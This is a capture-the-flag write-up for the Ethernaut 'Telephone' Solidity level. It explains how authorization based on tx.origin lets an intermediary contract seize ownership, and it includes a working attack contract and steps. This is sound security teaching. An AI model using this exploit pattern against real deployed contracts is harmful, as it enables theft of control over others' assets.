# Ethernaut Telephone Level Attack

## Goal

Claim ownership of the contract below to complete this level.

---

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

```

## Root cause

```solidity
function changeOwner(address _owner) public {
    if(tx.origin != msg.sender) {
        owner = _owner
    }
}

```

The problem cause here is using `tx.origin` for authorization logic, as `tx.origin` is the origin external wallet address that started the whole transaction. So to take the ownership of this contract, just need to create a attack contract stay between wallet address and `Telephone` contract to make the wallet address be different from "msg.sender" address, make the line `if(tx.origin != msg.sender)` become true and take the ownership

## Attack contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    function attack(address telephoneAddress) external {
        ITelephone(telephoneAddress).changeOwner(msg.sender);
    }
}

```

## Attack plan

Step 1: Create a attacker contract as above stay between your wallet address and the owner or `Telephone` contract address

Step 2: Call `attack()` function inside "TelephoneAttack", so it passes your wallet address as the new owner 

Your wallet -> TelephoneAttack -> Telephone

Inside the attack contract, `msg.sender` is my wallet address, so the attack contract passes my wallet address into `Telephone.changeOwner()` as the new owner.

Step 3: When `Telephone.changeOwner()` is executed, the direct caller is now the `TelephoneAttack` contract. Therefore, inside the `Telephone` contract:

```solidity
tx.origin = my wallet address;
msg.sender = TelephoneAttack contract address;
```

Step 5: Since the condition is true, the contract executes:
```solidity
owner = _owner
```
Then claim the ownership